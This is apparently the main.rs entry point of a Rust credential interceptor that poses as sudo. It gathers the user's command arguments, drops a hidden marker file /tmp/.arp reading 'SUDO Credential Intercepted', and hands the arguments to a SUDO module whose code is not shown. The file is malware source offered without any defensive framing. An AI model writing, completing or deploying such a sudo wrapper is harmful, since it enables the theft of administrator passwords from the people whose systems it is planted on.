mod modules; 

use std::{env, fs::{self, File}, io::prelude::*};

fn main() {

    let args: Vec<_> = env::args().collect();
    let mut arguments = String::new();

    // Getting the arguments 
    for arg in args.iter().skip(1) {
        arguments.push_str(" ");
        arguments.push_str(&arg); 
    }
    
    //Check file and write 
    match fs::metadata("/tmp/.arp") {
        Ok(_) => {
                        modules::SUDO(arguments); 
                    },
        Err(_) => {
                        // Creating file in tmp
                        let mut file = File::create("/tmp/.arp").unwrap();
                        file.write_all(format!("SUDO Credential Intercepted").as_bytes()).unwrap();

                        modules::SUDO(arguments); 
                    },
    }

}

